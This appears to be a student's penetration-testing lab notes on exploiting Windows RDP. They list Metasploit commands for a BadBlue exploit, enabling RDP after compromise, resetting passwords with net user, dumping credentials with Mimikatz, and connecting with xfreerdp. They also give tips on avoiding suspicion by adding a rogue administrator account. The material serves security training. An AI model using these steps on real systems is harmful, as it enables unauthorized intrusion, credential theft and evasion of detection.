###RDP
* Remote Desktp Protocol is a proprietary GUI remote access protocol developed by Microsoft
* USed to remotely connect and interact with Windows system.
* Uses TCP port 3389 by default --> Disabled by default
* **How to exploit**
  * MSF exploit module can be utilized to enable RDP and access the system through it.
  * RDP authentication requires a legitimatte user account on the target.
 
  * PRACTICAL
  * Repeat steps unitl db_nmap
  * **Open RDP**
  * `use exploit/windows/http/badblue_passthru`
  * `set target BadBlue\ EE\ 2.7\ Universal`
  * `run` --> This doesn't work in the lab.
  * After getting meterpreter session, put that to background
  * `use post/windows/manage/enable_rdp`
  * `set session [ID]`
  * `exploit` --> This will open the port running the RDP service
  * Then we can change the apssword of any user, which is not recommended as it may raise suspicions of a compromise. However to do it:
  * `net users` --> Look for all the users on the network
  * `net user [Username] [New password]`
  * To know the old password: Using hash cracking methods or use Mimikatz to dump clear-text passwords.
  * **How to interact with RDP from a linux system**
  * `xfreerdp /u:[Username] /p:[New password] /v:[Target_IP]` --> Will raise suspicions
  * Otherwise create another user and ad dit to the Administrators group to get the privileges to lower the suspicions.
